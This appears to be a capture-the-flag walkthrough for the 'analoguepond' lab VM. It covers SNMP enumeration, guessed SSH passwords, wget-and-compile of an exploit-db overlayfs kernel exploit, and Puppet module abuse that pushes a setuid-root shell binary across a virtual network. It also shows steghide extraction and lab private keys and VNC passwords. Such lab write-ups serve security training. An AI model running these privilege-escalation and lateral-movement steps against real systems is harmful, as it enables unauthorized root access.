@@ -1,0 +1,372 @@
+Recon Phase:
+
+$ nmap -sS -sU -T4 -A -v 172.16.34.160
+    22/tcp  open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   1024 b8:83:a1:ee:76:be:b7:3f:b9:45:ad:b4:ba:47:8b:75 (DSA)
+    |   2048 19:98:89:e1:d4:4c:42:2b:ca:da:37:79:99:1b:c9:ab (RSA)
+    |_  256 81:5d:1c:e1:2b:03:7d:e3:18:c3:bc:a0:cf:0b:f7:63 (ECDSA)
+    161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+    | snmp-info:
+    |   enterprise: net-snmp
+    |   engineIDFormat: unknown
+    |   engineIDData: 096a5051642b555800000000
+    |   snmpEngineBoots: 22
+    |_  snmpEngineTime: 26m30s
+    | snmp-sysdescr: Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+    |_  System uptime: 26m30.74s (159074 timeticks)
+
+I used snmp_enum from metasploit
+$ use auxiliary/scanner/snmp/snmp_enum
+$ set rhosts 172.16.34.160
+$ run
+    [+] 172.16.34.160, Connected.
+
+    [*] System information:
+
+    Host IP                       : 172.16.34.160
+    Hostname                      : analoguepond
+    Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu
+    SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
+    Contact                       : Eric Burdon <eric@example.com>
+    Location                      : There is a house in New Orleans they call it...
+
+I searched for "There is a house in New Orleans they call it" and it's a song
+There is a house in New Orleans,
+They call the rising sun.
+Then i tried access using ssh with username eric and password therisingsun
+$ ssh eric@172.16.34.160
+
+    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.19.0-25-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Mon Apr 24 04:50:48 BST 2017
+
+  System load: 0.39              Memory usage: 3%   Processes:       94
+  Usage of /:  80.7% of 5.39GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+================================================================================
+Privilege Escalation :
+
+$ id
+    uid=1000(eric) gid=1000(eric) groups=1000(eric),4(adm),24(cdrom),
+    30(dip),46(plugdev),111(libvirtd),112(lpadmin),113(sambashare)
+$ uname -a
+    Linux analoguepond 3.19.0-25-generic
+using overlayfs exploit
+https://www.exploit-db.com/exploits/39166/
+$ cd /tmp
+$ wget https://www.exploit-db.com/download/39166
+$ mv 39166 overlayfs.c
+$ gcc overlayfs.c overlayfs
+$ ./overlayfs
+$ id
+    uid=0(root) gid=1000(eric) groups=0(root),4(adm),24(cdrom),30(dip),
+    46(plugdev),111(libvirtd),112(lpadmin),113(sambashare),1000(eric)
+$ cat /root/flag.txt
+    C'Mon Man! Y'all didn't think this was the final flag so soon...?
+
+    Did the bright lights and big city knock you out...? If you pull
+    a stunt like this again, I'll send you back to Walker...
+
+    This is obviously troll flah #1 So keep going. --> Troll Flag
+================================================================================
+By looking at iptables
+    Chain FORWARD (policy ACCEPT)
+    target     prot opt source               destination
+    ACCEPT     all  --  anywhere             192.168.122.0/24     ctstate RELATED,ESTABLISHED
+    ACCEPT     all  --  192.168.122.0/24     anywhere
+    ACCEPT     all  --  anywhere             anywhere
+    REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable
+    REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable
+There is forward to network 192.168.122.0
+Then i tried to look deeper
+$ arp -n
+    Address                  HWtype  HWaddress           Flags Mask            Iface
+    172.16.34.2              ether   00:50:56:f7:cd:d1   C                     eth0
+    172.16.34.1              ether   00:50:56:c0:00:08   C                     eth0
+    172.16.34.254            ether   00:50:56:e8:2d:49   C                     eth0
+    192.168.122.2            ether   52:54:00:5b:05:f7   C                     virbr0
+    192.168.122.3            ether   52:54:00:6d:93:6a   C                     virbr0
+
+2 IPs on a virtual interface 192.168.122.2 192.168.122.3
+Then i tried ssh with both machines and only 192.168.122.2 accepts with a message
+    +-----------------------------------------------------------------------------+
+    | Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
+    | most famous song                                                            |
+    +-----------------------------------------------------------------------------+
+I googled about Sandie Shaw and her most famous song is Puppet on a String
+    "Sandie Shaw (born Sandra Ann Goodrich; 26 February 1947) is an English singer.
+    One of the most successful British female singers of the 1960s, in 1967 the song
+    "Puppet on a String" performed by her" Wikipedia
+Then i tried ssh with username:sandieshaw and password:puppetonastring
+
+$ ssh sandieshaw@192.168.122.2
+$ ls -a
+    .bash_history  .bashrc  .cache  .puppet  .ssh
+There is a puppet on this machine
+$ ps aux | grep puppet
+puppet     987  2.5  5.3 383036 54536 ?        Ssl  22:43   0:45 /usr/bin/ruby /usr/bin/puppet master
+i checked the puppet service until i found this manifest
+$ cd /etc/puppet/modules/wiggle/manifests
+$ cat init.pp
+    ## My first puppet module by Nick Leeson (C) Barringsbank
+    ## Put spin binary in /tmp to confirm puppet is working
+    class wiggle {
+
+    file { [ "/tmp/spin" ]:
+      ensure  => present,
+      mode    => 4755,
+      owner   => root,
+      group   => root,
+      source  => "puppet:///modules/wiggle/spin";
+      }
+
+
+    }
+There is an executable in puppet file,then puppet copy that to /tmp and it will be executable as root
+$ cat /etc/puppet/modules/wiggle/files/spin.c
+    #include <stdio.h>
+    #include <unistd.h>
+
+    void
+    advance_spinner() {
+        static char bars[] = { '/', '-', '\\', '|' };
+        static int nbars = sizeof(bars) / sizeof(char);
+        static int pos = 0;
+
+        printf("%c\r", bars[pos]);
+        fflush(stdout);
+        pos = (pos + 1) % nbars;
+    }
+
+    int
+    main() {
+        while (1) {
+            advance_spinner();
+            usleep(300);
+        }
+
+        return 0;
+    }
+
+i tried to replace spin in /etc/puppet/modules/wiggle/files with /bin/bash but i failed
+Then i used a c code to start a shell and compiled it and copy it to the machine
+http://stackoverflow.com/questions/30149779/c-execve-parameters-spawn-a-shell-example
+
+    #include <unistd.h>
+    int main() {
+            char *args[2];
+            args[0] = "/bin/sh";
+            args[1] = NULL;
+            execve(args[0], args, NULL);
+    }
+Then i waited until puppet copy the file to /tmp
+Then from /tmp
+$ ./spin
+$ id
+    uid=1000(sandieshaw) gid=1000(sandieshaw) euid=0(root) groups=0(root),
+    4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(sandieshaw)
+$ cd /root/protovision
+$ cat jim
+    Mr Potato Head! Backdoors are not a...
+$ cat melvin
+    Boy you guys are dumb! I got this all figured out...
+$ cat flag1.txt.0xff
+    3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a
+    3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c
+    756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a7946
+    3256676732593046326467777961793932646751334a754e585a765247497a6c4761
+    3042695a4a4279615535454d70647a614b706b5a48316a642f673259304632647630
+    32626a35535a6956486431395765756333643339794c364d486330524861 --> Flag 1
+================================================================================
+It's a hex code and when i decoded it , it gave me
+    ==gLu4yZulGa0VWbvNHIy9GIlJXZoRHIkJ3b3N3chBHIhBCZulmZgQHanlWbgU3b5BCLulG
+    IzVGd15WatByMyASbvJnZgMXZtF2ZyF2Vgg2Y0F2dgwyay92dgQ3JuNXZvRGIzlGa0BiZJB
+    yaU5EMpdzaKpkZH1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa
+It's base64 in backward, then i tried to reverse this string and it gave me
+    aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1HZkpKazdpME5UayBJZiB0aGlzIG
+    RvZXNuJ3Qgd29yaywgd2F0Y2ggV2FyZ2FtZXMgZnJvbSAyMyBtaW51dGVzIGluLCB5b3Ug
+    bWlnaHQgZmluZCBhIHBhc3N3b3JkIHRoZXJlIG9yIHNvbWV0aGluZy4uLg==
+After decode this base64 it gave me
+    https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work,
+    watch Wargames from 23 minutes in, you might find a password there or something...
+After watching the missing word from Jim's file is secrets and the maize is maybe what inside .I_have_you_now directory, so i followed it
+$ ls
+    my_world_you_are_persistent_try    nleeson_key.gpg
+$ cat my_world_you_are_persistent_try
+    joshua
+$ gpg nleeson_key.gpg
+i tried joshua and no luck then i tried "secret" and it worked
+$ cat nleeson_key
+    -----BEGIN RSA PRIVATE KEY-----
+    Proc-Type: 4,ENCRYPTED
+    DEK-Info: AES-128-CBC,1864E0393453C88F778D5E02717B8B16
+
+    RTSpHZnf1Onpy3OHfSat0Bzbrx8wd6EBKlbdZiGjEB0AC4O0ylrSBoWsEJ/loSL8
+    jdTbcSG0/GWJU7CS5AQdK7KctWwqnOHe9y4V15gtZcfgxNLrVfMUVAurZ3n2wQqK
+    ARmqBXhftPft8EBBAwWwQmBrD+ufF2uaJoKr4Bfu0zMFQxRnNDooBes5wyNO/7k6
+    osvGqTEX/xwJG1GB5X0jsDCmBH4WXhafa0nzZXvd2Pd3UpaWPEgyq3vxIQaredR8
+    VbJbPSeKypTIj3UyEj+kjczhCiWw9t0Mv0aV4FtMOesnDQYJskL8kSLGRkN+7lHD
+    IcHz7az9oqYGBSq77lPkmk7oIpT/pg80pfCyHExROwlTRPzVRHv7KGiKd35R0Hl9
+    7CUQPCjH5ltQW4B6XUmxmoT8N14w5HOxb/JlV7s2g6dXYT0azOeqDsGivpgMY3vy
+    rtVakLIsZeYaZYSr6WvTFclXWYctYPMgzRewiRPjyn6DXiD6MtCJZj2CqJ47tP37
+    eRRgRRH6a1Sm/BkfSPIXlV0tTpOXfjtHG7VoIc5X343GL/WHM/nhNFvMLdRnVXRM
+    YOEKAsYklBLqZ99btTESwJZt9HG/cGpQrbgFwxKPoJy7f5wNLOa1ZhpDyw1IqokO
+    Pq4r8zZj4ASyg3gl7ByG11C272mkMG8yiIwOckVgNec/se18PUGBw1HHgRuyzDym
+    /6/cwkDzoJlResjsNDQCQcNzSOoZxi3GFIIiB+HjG84MF+ofnn3ayaUZLUaBbPMJ
+    jQ7dP6wqIMYwY5ZM6nRQ+RnL6QVBHnXH9RjmbzdVMzmQDjPS0lOg5xkU8B78vG6e
+    lphvmlLSM+PFVOqPwhVB8yon97aU23npKIOPu44VsUXU0auKI94qoX0I1EDDQFrE
+    UqpWUpCCHrRRTZCdnnE6RnJZ+rjGPvFA95lhUp1fpF8l4U3a8qKlsdtWmzYxHdyg
+    +w0QE8VdDsNqgCP7W6KzvN5E5HJ0bbQasadAX5eDd6I94V0fCZrPlzM+5CAXH4E4
+    qhmWQPCw7Q1CnW61yG8e9uD1W7yptK5NyZpHHkUbZGIS+P7EZtS99zDPh3V4N7I2
+    Mryzxkmi2JyQzf4T1cfK7JTdIC2ULGmFZM26BX3UCV0K+9OOGgRDPU4noS0gNHxP
+    VaWVmjGgubE4GDlW0tgw1ET+LaUdAv/LE+3gghpRLn1imdaW9elnIeaVeOWcyrBC
+    Ypl8AjYXNRd0uLWBC8xbakmK1tZUPXwefqjQpKjuIuYmmVes3M4DFxGQajmK03nO
+    oGaByHu0RVjy0x/zBuOuOp6eKpeaiLWfLM5DSIWlksL/2dmAloSs3LrIPu4dTnRb
+    v2YQ+72nLI62alLEaKwXUBoHSSRNTv0hbOyvV8YUp4EmJ8yShAmEE/n9Et62BwYB
+    rsi0RhEfih+43PzlwB91I4Elr2k3eBwQ9XiF3KdVgj6wvwqNLZ7aC5YpLcYaVyNT
+    fKzUxX02Ejvo60xWJ8u6GIhUK404s2WVeG/PCLwtrKGjpyPCn3yCWpCWpGPuVNrx
+    Wg0Um581e4Vw5CLDL5hRLmo7wiqssuL3/Uugf/lc2vF+MxJyoI1F9Zkt2xvRYrLB
+    -----END RSA PRIVATE KEY-----
+it's a private key
+then i tried ssh to 192.168.122.3 with user nleeson using this private key
+$ chmod 600 nleeson_key
+$ ssh -i nleeson_key nleeson@192.168.122.3
+    nter passphrase for key 'nleeson_key':
+I tried joshua and it worked
+
+Back to Sandieshaw's box
+There is a puppet module names fiveeights
+$ cat /etc/puppet/modules/fiveeights/manifests/init.pp
+    class fiveeights {
+
+    ## private key held elsewhere. Keep looking
+      file { '/home/nleeson/.ssh/authorized_keys':
+      content => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1Pgms
+      IxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4
+      vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8
+      a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ
+      2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9
+      Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet",
+      }
+    }
+This module is responsible for pushing sandieshaw's public key to 192.168.122.3 as authorized_key
+I tried to add the same code for spin to be root by adding
+    file { [ "/tmp/spin" ]:
+      ensure  => present,
+      mode    => 4755,
+      owner   => root,
+      group   => root,
+      source  => "puppet:///modules/wiggle/spin";
+      }
+to fiveeights module , and puppet should push the altered spin file to 192.168.122.3 inside /tmp
+and i waited until puppet push the spin file into /tmp on 192.168.122.3 machine
+then form /tmp
+$ ./spin
+$ id
+    uid=1000(nleeson) gid=1000(nleeson) euid=0(root) groups=0(root),
+    4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(nleeson)
+a file named me.jpeg inside /root , and also there was 2 images in eric named reticulatingsplines.gif
+I got a little help how to deal with it , i copied me.jpeg on my local machine
+and i used steghide to exttract the hidden data with password "reticulatingsplines"
+$ steghide --extract -sf me.jpeg
+    wrote extracted data to "primate_egyptian_flag.txt"
+primate_egyptian_flag.txt is a big file with hex code in it
+After decoding it gave me
+    gACIgACIgACIgACIgACIgACIgACIgAiCK4iLuU3b5BicvZGIzNXYiBiclRmblZGIhBycnUmclhkC
+    gACIgACIgACIgACIgACIgACIgACIgACIgACIK8lLt0SLu8FIgACIgACIg4SLsACIgACIgACIgACI
+    gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK4CYgACIgACIgcyJt4yXf5CXgBCI8BCIgACI
+    f91Xf91Xf91Xf91Xf91Xu0zKrsCLgACIgACIgACIgAiCcBCIg4CLgAyXgACIgACIgAyXgACXgACI
+    90TP90TP90TP90TP90TP94ybv9mLfhCIgACIgACIgACIKwHIgACI8x3X89Fff91Xf91X8x3Xp81X
+    8BCIgACIgACIgACIgACIgACIn4nfgACIgACIgACIgACIgoAfgACIgwHf9wXP81TP90TP9wHf90TP
+    gwFIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK8CIg8GIvByJ+BGIgACIgAyJ+BCI
+    gcifgBCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIK8CIg8GIvBCIgACIcBmfvACI
+    vZGIk5WYg4WahdWYgU2Yu9GI19Weg8GdgMnbvlGdhxWd0Fmcn52bDpgCKAyJt4yXf91Xu0CYgACI
+    g8GdgQWZpJHdgUmdnkkCKASInFGbmpwcphGdgcmbpJXd0BXYjBibvBSZtlGdggGd4l2cgUGa0Bic
+    sB3chRXZtBydvJHa0BSbvJnZgkXY3FGIlZ3btByb0BCLlJXZoBCdpJGIhBCc1Bycn5WaoRHI4lWb
+    0BCZll3bq5WZgUmdhhGI19WegUGcvhGIJBiLzdmbphGdgQXYgMHdp9GbwhXZgIWZ3BCZuFmC0l2b
+    wBXYgUmYgQGb192dgQ3YlB3chBycphGdg42bgs2YhJGZlVmZKIXdvlHIk5WYg42bpRncvBHI0FGa
+    jV2cgMWa0FWbvRXdhBybkByb0BCdlNHIlJXYgMXTWBSZzVGa0BCLlR3buBiZPpgCuQWZ0FWajVmc
+    gM3ZulGa0BCclV2ag8GdgQHanV3bgMXaoRHIvNnCsQXZwBXdwByZul2c1ByclRXYkBXdgkHdpJXd
+    C1GMk5WYSBCLuNjQy1GIvRHIztmbhhGdgknbh1kCK4SZsB3blBHIy9mZgg2Z19mblByYp1WYulHZ
+    5ByauFGa0BCbhl2YlB3cgEkCK4iRUNEIzlGa0ByZulGdzVGdgI3bmBieu5Wa2V2agQmbhBiWlRXe
+    hZnClhGdgQmbhBycldmblxGbhh2YgU2clhGdgwGbhByZulGdz9GagI3bmByaxkWb0BzZg8GdgU3b
+    hBCduV2YlJHIzlGagI3bmBibzImctByb0BCdhhGIlhGdgY2bgAXa0BSQg4SZjlmdkFGIlxmYhVHb
+    vZGIn5War92bsBSZyFGI19WegYWagIXZ0RXa3RHIy9GIDJVSg42bgUWbKQXaIBiLlNmbhR3cpN3c
+    0VGbw12bDBCLu9GIvdkCK4SZn5WZsxWYoNmClhGdgQWZ0VGbw12bjBSZ2FGagI3bgQnbphGIhBic
+    zRmbllmcGBic19EIm9GIxMCIlR2bzlGclBiZvBSN0ozNwAyb0BCMzojNwAiOlx2Yyl2YgUGa0BSZ
+    gowPu4iLu42bpR3Yl5mbvNGIlhGdgM3J0FGaXBiLuUTO5EDIDJkQgkyQoACa0J3bOBSZoRlCulEI
+    gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI
+    =oQZyFWb0h2Zp52St0CI
+it seems also in reverse , so after reversing it line by line it gave me
+   CkhlcmUncyBhIGZlbmRlciBiYXNzIGZvciB5b3UuLi4KCiAgICAgICAgICAgICAgICAgICAgICAg
+   ICAgICAgICAgICAsLS4gICAgICAgIF8uLS0tLl8KICAgICAgICAgICAgICAgICAgICAgICAgICAg
+   ICAgICB8ICBgXC5fXy4tJycgICAgICAgYC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+   ICAgXCAgXyAgICAgICAgXyAgLC4gICBcCiAgICAgICAgICAgLCsrKz0uX19fX19fX19fX19fX19f
+   X18pX3x8X19fX19ffF98X3x8ICAgIHwKICAgICAgICAgIChfLm9vby49PT09PT09PT09PT09PT09
+   PT09fHw9PT09PT18PXw9fHwgICAgfAogICAgICAgICAgICAgfn4nICAgICAgICAgICAgICAgICB8
+   ICB+JyAgICAgIGB+JyBvIG8gIC8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwg
+   ICAvfmBcICAgICBvIG8gIC8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgficg
+   ICAgYC0uX19fXy4tJyAKCgpDb25ncmF0dWxhdGlvbnMgdG8geW91IG9uY2UgYWdhaW4gYW5kIGZv
+   ciB0aGUgc2l4dGggdGltZSBvbiBjYXB0dXJpbmcgdGhpcwpmbGFnISAKCkkndmUgdHJpZWQgdG8g
+   bWl4IHRoaW5ncyB1cCBhIGJpdCBoZXJlLCB0byBtb3ZlIGF3YXkgZnJvbSB0aHJvdyBtZXRhc3Bs
+   b2l0CmFuZCB3ZWIgZXhwbG9pdHMgYXQgdGhpbmdzLiBJIGhvcGUgeW91IGhhdmUgZW5qb3llZCB0
+   aGF0IHBvcnRpb24gYW5kIHlvdXIKZmVlZGJhY2sgb24gdGhpcyBhc3BlY3Qgd291bGQgYmUgYXBw
+   cmVjaWF0ZWQuCgpPZiBub3RlLCB0aGVzZSBWTXMgYXJlIHNldCB0byBkbyBhdXRvbWF0aWMgc2Vj
+   dXJpdHkgdXBkYXRlcyB1c2luZyBwdXBwZXQsCnNvIHRoaXMgb3VnaHQgdG8ga2VlcCB0aGluZ3Mg
+   ZHluYW1pYyBlbm91Z2ggZm9yIHBlb3BsZS4KCk1hbnkgdGhhbmtzIHRvIG1yQjNuLCBSYW5kMG1C
+   eXRlWiBhbmQga2V2aW5ueiBmb3IgdGVzdGluZyB0aGlzIENURi4KCkEgc3BlY2lhbCB0aGFuayB5
+   b3UgdG8gZzB0bWkxayBmb3IgaG9zdGluZyBhbGwgdGhlc2UgY2hhbGxlbmdlcyBhbmQgdGhlCnZh
+   bHVhYmxlIGFkdmljZS4gQSB0aXAgb2YgdGhlIGhhdCB0byBtcmIzbiBmb3IgaGlzIHJlY2VudCBh
+   c3Npc3RhbmNlLiBIaXQKbWUgb24gSVJDIG9yIHR3aXR0ZXIgaWYgeW91IGFyZSBsb29raW5nIGZv
+   ciBhIGhpbnQgb3IgaGF2ZSBjb21wbGV0ZWQgdGhlCmNoYWxsZW5nZS4KCkdvIG9uLCBDb21wbGV0
+   ZSB0aGUgY2lyY2xlOiAwNjozMCB0byAwNzo0NSBvZiBlcGlzb2RlICMxIG9mIE91ciBGcmllbmRz
+   IEluClRoZSBOb3J0aCAoQykgQkJDIDE5OTUuLiBXaGF0J3MgdGhlIGNvbm5lY3Rpb24uLi4uPwog
+   ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+   IC0tS25pZ2h0bWFyZQo=
+$ base64 -d hex.txt
+    Here's a fender bass for you...
+
+                                      ,-.        _.---._
+                                    |  `\.__.-''       `.
+                                     \  _        _  ,.   \
+               ,+++=._________________)_||______|_|_||    |
+              (_.ooo.===================||======|=|=||    |
+                 ~~'                 |  ~'      `~' o o  /
+                                      \   /~`\     o o  /
+                                       `~'    `-.____.-'
+
+
+    Congratulations to you once again and for the sixth time on capturing this
+    flag!
+
+    I've tried to mix things up a bit here, to move away from throw metasploit
+    and web exploits at things. I hope you have enjoyed that portion and your
+    feedback on this aspect would be appreciated.
+
+    Of note, these VMs are set to do automatic security updates using puppet,
+    so this ought to keep things dynamic enough for people.
+
+    Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.
+
+    A special thank you to g0tmi1k for hosting all these challenges and the
+    valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
+    me on IRC or twitter if you are looking for a hint or have completed the
+    challenge.
+
+    Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In
+    The North (C) BBC 1995.. What's the connection....?
+                                                               --Knightmare --> Flag 2
+================================================================================
+vnc passwords:
+
+Back to eric's box
+$ cd /etc/libvirt/qemu/
+$ cat puppet.xml | grep vnc
+    <graphics type='vnc' port='-1' autoport='yes' listen='127.0.0.1' passwd='sendyoubacktowalker'>
+$ cat barringsbank.xml | grep vnc
+    <graphics type='vnc' port='-1' autoport='yes' passwd='memphistennessee'/>
